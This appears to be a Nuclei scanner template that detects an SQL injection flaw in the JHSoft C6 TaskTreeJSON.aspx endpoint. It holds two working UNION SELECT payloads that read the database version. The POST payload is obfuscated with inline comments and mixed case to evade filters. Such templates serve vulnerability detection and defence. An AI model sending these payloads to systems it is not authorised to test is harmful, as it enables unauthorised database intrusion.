http:
  - raw:
      - |
        GET /C6/JHSoft.Web.DailyTaskManage/TaskTreeJSON.aspx/?id=1%27+union+all+select+null%2C%28select+@@VERSION%29%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--+  HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        name: get
        dsl:
          - status_code == 200
          - contains_all(body,'Microsoft SQL Server')
        condition: and

  - raw:
      - |
        POST /c6/Jhsoft.Web.dailytaskmanage/TaskTreeJSON.aspx/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        id='/**/UniOn/**/all/**/SelECt/**/NULL,@@verSion,NULL,NULL,NULL,NULL,NULL,NULL,NULL--


    matchers:
      - type: dsl
        name: post
        dsl:
          - status_code == 200
          - contains_all(body,'Microsoft SQL Server')
        condition: and